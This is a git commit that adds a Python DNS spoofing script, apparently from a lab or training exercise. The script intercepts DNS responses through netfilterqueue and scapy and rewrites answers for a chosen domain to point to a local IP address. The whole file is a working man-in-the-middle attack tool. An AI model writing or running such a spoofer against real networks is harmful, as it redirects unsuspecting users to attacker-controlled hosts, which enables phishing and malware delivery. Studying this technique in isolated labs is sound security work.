e1b2ce7bb92e290d8b6a3693d02704b3a347b65b
root <root@localhost.localdomain>
2019-02-14 22:37:09 -0500

    upload DNS spoofer

---
+++ dns_spoof/dns_spoof.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        # print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "vbrant.eu" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
